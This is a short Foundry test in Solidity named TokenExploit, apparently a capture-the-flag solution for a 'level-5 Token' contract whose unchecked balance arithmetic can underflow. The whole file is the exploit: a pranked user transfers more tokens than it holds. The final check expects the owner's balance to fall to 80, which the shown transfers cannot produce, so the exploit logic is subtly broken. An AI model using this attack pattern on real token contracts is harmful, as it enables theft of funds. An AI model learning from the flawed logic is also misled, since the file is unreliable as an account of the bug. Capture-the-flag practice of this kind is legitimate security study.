// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "../lib/forge-std/src/Test.sol";
import {console} from "../lib/forge-std/src/console.sol";
import {Token} from "../src/level-5_Token.sol";

contract TokenExploit is Test
{
  error incorrectBalance();

  Token tk;
  address owner;
  address user;

  function setUp() public
  {
    owner = address(this);
    user = makeAddr("user");
    tk = new Token(1000);
  }

  function testExploit() public
  {
    console.log("1111");

    if (tk.balanceOf(owner) != 1000)
      revert incorrectBalance();

    console.log("2222");

    tk.transfer(address(user), 20);

    if (tk.balanceOf(owner) != 980)
      revert incorrectBalance();

    console.log("3333");

    vm.prank(user);
    tk.transfer(address(user), 900);

    if (tk.balanceOf(owner) != 80)
      revert incorrectBalance();
    
    console.log("4444");
  }
}

